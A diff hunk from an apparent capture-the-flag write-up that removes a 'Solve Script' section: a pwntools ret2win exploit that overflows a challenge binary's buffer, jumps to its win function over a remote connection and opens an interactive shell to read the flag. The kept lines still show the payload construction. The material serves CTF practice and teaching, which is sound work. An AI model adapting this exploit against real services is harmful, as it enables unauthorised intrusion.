@@ -139,30 +139,6 @@ offset = 264
 payload = b'A' * offset + p64(ret) + p64(win)
 ```
 
-## Solve Script (Solve2.py)
-
-The final remote exploit script connects to the service, performs the overflow, and then uses the shell to read the flag:
-
-```python
-from pwn import *
-
-context.binary = elf = ELF("./chal", checksec=False)
-rop = ROP(elf)
-
-win = elf.sym["win"]
-ret = rop.find_gadget(["ret"])[0]
-
-offset = 264
-payload = b"A" * offset + p64(ret) + p64(win)
-
-io = remote("amt.rs", 30382)
-io.recvuntil(b"write? ")
-io.sendline(b"400")
-io.sendline(payload)
-
-io.interactive()
-```
-
 Running it:
 
 ```text
